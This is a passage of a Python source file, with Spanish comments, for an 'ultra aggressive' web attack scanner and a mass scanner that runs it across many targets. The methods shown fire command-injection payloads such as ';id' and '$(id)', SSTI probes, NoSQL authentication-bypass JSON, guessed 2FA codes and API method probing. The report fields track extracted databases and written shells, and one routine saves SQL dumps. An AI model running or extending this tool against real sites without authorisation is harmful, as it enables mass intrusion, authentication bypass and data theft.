                                'CRITICAL',
                                endpoint,
                                f"XXE detectado - {indicator}",
                                {'payload': payload[:200], 'indicator': indicator}
                            )
                            break
                
                except:
                    continue
    
    def advanced_rce_attack(self):
        """Ataque RCE avanzado"""
        self.log_signal.emit("⚡ EJECUTANDO RCE AVANZADO...")
        
        rce_payloads = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
        ]
        
        urls_to_test = list(self.crawled_urls)[:30]
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Parámetros comunes para RCE
            rce_params = ['cmd', 'command', 'exec', 'system']
            
            for param in params:
                param_lower = param.lower()
                if any(rce_param in param_lower for rce_param in rce_params):
                    for payload in rce_payloads[:10]:
                        try:
                            test_url = url.replace(f"{param}={params[param][0]}", f"{param}={params[param][0]}{payload}")
                            response = self.session.get(test_url, timeout=10)
                            
                            # Indicadores de RCE exitoso
                            rce_indicators = [
                                'uid=', 'gid=', 'groups=', 'root',
                            ]
                            
                            for indicator in rce_indicators:
                                if indicator in response.text:
                                    self.report_vulnerability(
                                        'RCE',
                                        'CRITICAL',
                                        test_url,
                                        f"RCE en {param}: {indicator}",
                                        {'param': param, 'payload': payload, 'indicator': indicator}
                                    )
                                    break
                        
                        except:
                            continue
    
    def ssti_ssi_attack(self):
        """Ataque SSTI/SSI"""
        self.log_signal.emit("🪢 EJECUTANDO SSTI/SSI INJECTION...")
        
        ssti_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
        ]
        
        urls_to_test = list(self.crawled_urls)[:20]
        
        for url in urls_to_test:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for param in params:
                for payload in ssti_payloads:
                    try:
                        test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                        response = self.session.get(test_url, timeout=5)
                        
                        # Buscar ejecución de código
                        if '49' in response.text:
                            self.report_vulnerability(
                                'SSTI_SSI',
                                'HIGH',
                                test_url,
                                f"SSTI/SSI en {param}: {payload}",
                                {'param': param, 'payload': payload}
                            )
                            break
                    
                    except:
                        continue
    
    def nosql_injection_attack(self):
        """Ataque NoSQL Injection"""
        self.log_signal.emit("🍃 EJECUTANDO NoSQL INJECTION...")
        
        nosql_payloads = [
            '{"$ne": null}',
            '{"$ne": ""}',
            '" || "1"=="1',
        ]
        
        # Endpoints NoSQL comunes
        nosql_endpoints = [
            f"{self.target_url}/api/login",
            f"{self.target_url}/api/user",
            f"{self.target_url}/login",
        ]
        
        for endpoint in nosql_endpoints:
            for payload in nosql_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    
                    # Test como JSON
                    try:
                        json_payload = json.loads(payload.replace("'", '"'))
                        response = self.session.post(endpoint, json=json_payload, headers=headers, timeout=5)
                        
                        if response.status_code == 200 and ('success' in response.text.lower()):
                            self.report_vulnerability(
                                'NOSQL_INJECTION',
                                'HIGH',
                                endpoint,
                                f"NoSQL Injection: {payload}",
                                {'payload': payload, 'response': response.text[:200]}
                            )
                    except:
                        pass
                
                except:
                    continue
    
    def advanced_2fa_bypass(self):
        """Bypass 2FA avanzado"""
        self.log_signal.emit("🔐 EJECUTANDO 2FA BYPASS AVANZADO...")
        
        bypass_methods = [
            f"{self.target_url}/api/verify-2fa",
            f"{self.target_url}/verify-2fa",
        ]
        
        for endpoint in bypass_methods:
            try:
                # Test códigos comunes
                common_codes = ['000000', '111111', '123456', '999999']
                
                for code in common_codes:
                    response = self.session.post(endpoint, data={'code': code}, timeout=5)
                    
                    if response.status_code == 200:
                        if 'success' in response.text.lower():
                            self.report_vulnerability(
                                '2FA_BYPASS',
                                'CRITICAL',
                                endpoint,
                                f"2FA bypass con código estático: {code}",
                                {'code': code, 'method': 'static_code'}
                            )
                            break
            
            except:
                continue
    
    def auto_exploit_all_apis(self):
        """Auto-explotación de todas las APIs encontradas"""
        self.log_signal.emit("⚡ AUTO-EXPLOTANDO TODAS LAS APIS...")
        
        api_patterns = ['/api/', '/v1/', '/rest/', '/graphql']
        
        for pattern in api_patterns:
            for url in list(self.crawled_urls)[:50]:
                if pattern in url:
                    try:
                        # Test métodos HTTP
                        methods = ['GET', 'POST', 'PUT', 'DELETE']
                        
                        for method in methods:
                            response = self.session.request(method, url, timeout=5)
                            
                            if response.status_code < 400:
                                # Buscar datos sensibles
                                sensitive_patterns = [
                                    'password', 'token', 'key', 'secret', 
                                    'api_key', 'email', 'phone'
                                ]
                                
                                for pattern in sensitive_patterns:
                                    if pattern in response.text.lower():
                                        self.report_vulnerability(
                                            'API_SENSITIVE_DATA',
                                            'HIGH',
                                            url,
                                            f"Datos sensibles en API: {pattern}",
                                            {'method': method, 'pattern': pattern}
                                        )
                    
                    except:
                        continue
    
    def subdomain_takeover_scan(self):
        """Escaneo de subdomain takeover"""
        self.log_signal.emit("🌐 BUSCANDO SUBDOMAIN TAKEOVER...")
        
        domain = urllib.parse.urlparse(self.target_url).netloc
        if ':' in domain:
            domain = domain.split(':')[0]
        
        # Subdominios comunes
        subdomains = [
            'www', 'api', 'admin', 'test', 'mail', 'ftp',
            'blog', 'shop', 'app', 'cdn', 'static',
        ]
        
        for sub in subdomains:
            test_url = f"http://{sub}.{domain}"
            
            try:
                response = self.session.get(test_url, timeout=3, allow_redirects=False)
                
                if response.status_code in [404, 400]:
                    self.report_vulnerability(
                        'SUBDOMAIN_TAKEOVER_POSSIBLE',
                        'MEDIUM',
                        test_url,
                        f"Subdominio no encontrado: {sub}.{domain}",
                        {'subdomain': sub, 'status': response.status_code}
                    )
                
                elif response.status_code < 400:
                    self.report_vulnerability(
                        'SUBDOMAIN_FOUND',
                        'INFO',
                        test_url,
                        f"Subdominio activo: {sub}.{domain}",
                        {'subdomain': sub, 'status': response.status_code}
                    )
            
            except:
                continue
    
    def deep_crawl(self, max_pages: int = 2000):
        """Crawling profundo"""
        visited = set()
        to_visit = [self.target_url]
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            
            if url in visited:
                continue
            
            visited.add(url)
            self.crawled_urls.add(url)
            
            try:
                response = self.session.get(url, timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Encontrar todos los enlaces
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urllib.parse.urljoin(url, href)
                    
                    if (self.target_url in full_url and 
                        full_url not in visited and 
                        full_url not in to_visit and
                        len(to_visit) < 1000):
                        to_visit.append(full_url)
                
                # Actualizar progreso
                if len(visited) % 100 == 0:
                    self.progress_signal.emit(
                        15 + (len(visited) / max_pages) * 15,
                        f"🕷️ Crawling: {len(visited)}/{max_pages} páginas"
                    )
                
                time.sleep(0.01)
                
            except Exception as e:
                continue
        
        self.log_signal.emit(f"✅ Crawling completado: {len(visited)} páginas")
    
    def detect_tech_stack(self, html: str, headers: Dict) -> List[str]:
        """Detectar stack tecnológico"""
        techs = []
        
        # Por headers
        server = headers.get('server', '').lower()
        if 'apache' in server:
            techs.append('Apache')
        if 'nginx' in server:
            techs.append('Nginx')
        if 'iis' in server:
            techs.append('IIS')
        
        # Por contenido HTML
        if 'wp-content' in html:
            techs.append('WordPress')
        if '.php' in html:
            techs.append('PHP')
        if '.aspx' in html:
            techs.append('ASP.NET')
        
        return techs
    
    def detect_waf(self, headers: Dict, html: str) -> str:
        """Detectar WAF"""
        waf_indicators = {
            'Cloudflare': ['cloudflare', '__cfduid'],
            'Akamai': ['akamai'],
            'Imperva': ['imperva', 'incapsula'],
        }
        
        for waf, indicators in waf_indicators.items():
            for indicator in indicators:
                if indicator in str(headers).lower():
                    return waf
        
        return ""
    
    def extract_forms(self, html: str) -> List[Dict]:
        """Extraer formularios"""
        forms = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'type': input_tag.get('type', 'text'),
                    'name': input_tag.get('name', ''),
                    'value': input_tag.get('value', '')
                }
                form_data['inputs'].append(input_data)
            
            forms.append(form_data)
        
        return forms
    
    def extract_comments(self, html: str) -> List[str]:
        """Extraer comentarios HTML"""
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        return [c.strip() for c in comments if len(c.strip()) > 0]
    
    def extract_js_files(self, html: str) -> List[str]:
        """Extraer archivos JavaScript"""
        js_files = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for script in soup.find_all('script', src=True):
            js_files.append(script['src'])
        
        return js_files
    
    def find_sensitive_endpoints(self, html: str) -> List[str]:
        """Encontrar endpoints sensibles"""
        endpoints = []
        
        sensitive_patterns = [
            r'["\'](/admin[^"\']*)["\']',
            r'["\'](/login[^"\']*)["\']',
            r'["\'](/config[^"\']*)["\']',
            r'["\'](/phpmyadmin[^"\']*)["\']',
        ]
        
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            endpoints.extend(matches)
        
        return list(set(endpoints))
    
    def report_vulnerability(self, vuln_type: str, severity: str, target: str, details: str, extra_data: Dict = None):
        """Reportar vulnerabilidad"""
        vuln_id = hashlib.md5(f"{vuln_type}{target}{details}".encode()).hexdigest()[:8]
        
        vuln_data = {
            'id': vuln_id,
            'type': vuln_type,
            'severity': severity,
            'target': target,
            'details': details,
            'timestamp': datetime.now().isoformat(),
            'extra_data': extra_data or {}
        }
        
        self.found_vulns.append(vuln_data)
        self.result_signal.emit(vuln_type, severity, target, details)
        
        # Guardar en archivo organizado
        try:
            filepath = FileOrganizer.save_vulnerability(
                "WEB", severity, vuln_type, target, details, extra_data
            )
            self.log_signal.emit(f"📁 Guardado en: {filepath}")
        except Exception as e:
            self.log_signal.emit(f"⚠ Error guardando vulnerabilidad: {e}")
        
        # Log especial para vulnerabilidades críticas
        if severity == 'CRITICAL':
            self.log_signal.emit(f"🚨 CRITICAL: {vuln_type} en {target}")
    
    def save_full_dump(self, url: str, param: str, payload_type: str, data: str):
        """Guardar dump completo"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_param = re.sub(r'[^\w]', '_', param)
            filename = f"{timestamp}_{safe_param}_DUMP.txt"
            
            # Usar FileOrganizer
            filepath = FileOrganizer.save_vulnerability(
                "WEB",
                "CRITICAL",
                "SQL_DUMP",
                url,
                f"SQL Dump - Parameter: {param}, Type: {payload_type}\n\n{data}",
                {'param': param, 'type': payload_type}
            )
            
            self.log_signal.emit(f"💾 DUMP GUARDADO: {filepath}")
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error guardando dump: {str(e)}")
    
    def generate_ultra_report(self):
        """Generar reporte ULTRA"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domain = urllib.parse.urlparse(self.target_url).netloc.replace(':', '_')
            
            # Usar FileOrganizer para crear estructura
            report_dir = "SCAN_RESULTS/SCANNER_WEB/REPORTS"
            os.makedirs(report_dir, exist_ok=True)
            
            # Reporte principal
            report = {
                'target': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.found_vulns),
                'critical_count': len([v for v in self.found_vulns if v['severity'] == 'CRITICAL']),
                'high_count': len([v for v in self.found_vulns if v['severity'] == 'HIGH']),
                'databases_extracted': len(self.extracted_databases),
                'shells_written': len(self.written_shells),
                'vulnerabilities': self.found_vulns,
                'databases': self.extracted_databases,
                'shells': self.written_shells,
            }
            
            with open(os.path.join(report_dir, f'{domain}_ULTRA_REPORT.json'), 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            self.log_signal.emit(f"📄 REPORTE ULTRA GUARDADO: {report_dir}")
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error generando reporte: {str(e)}")


class MassScanner(QThread):
    """Scanner masivo de múltiples objetivos"""
    
    progress_signal = Signal(int, str)
    result_signal = Signal(str, str, str, str)
    log_signal = Signal(str)
    scan_complete_signal = Signal(list)
    
    def __init__(self, targets: List[str], options: Dict):
        super().__init__()
        self.targets = targets
        self.options = options
        self.results = []
        self.active_scanners = []
        
    def run(self):
        """Ejecutar escaneo masivo"""
        try:
            total_targets = len(self.targets)
            
            for i, target in enumerate(self.targets[:CONFIG.max_targets_per_scan]):
                self.progress_signal.emit(
                    int((i / total_targets) * 100),
                    f"🔍 Escaneando {i+1}/{total_targets}: {target}"
                )
                
                # Crear scanner para este objetivo
                scanner = WebScannerUltraAggressive(target, self.options)
                
                # Conectar señales
                scanner.result_signal.connect(self.handle_result)
                scanner.log_signal.connect(self.handle_log)
                
                # Ejecutar sincrónicamente
                scanner.run()
                
                self.results.extend(scanner.found_vulns)
                
                # Pequeña pausa
                time.sleep(1)
            
            self.progress_signal.emit(100, "✅ Escaneo masivo completado")
            self.scan_complete_signal.emit(self.results)
            
        except Exception as e:
            self.log_signal.emit(f"❌ Error en escaneo masivo: {str(e)}")
    
    def handle_result(self, vuln_type: str, severity: str, target: str, details: str):
        """Manejar resultado"""
        self.result_signal.emit(vuln_type, severity, target, details)
    
    def handle_log(self, message: str):
        """Manejar log"""
        self.log_signal.emit(message)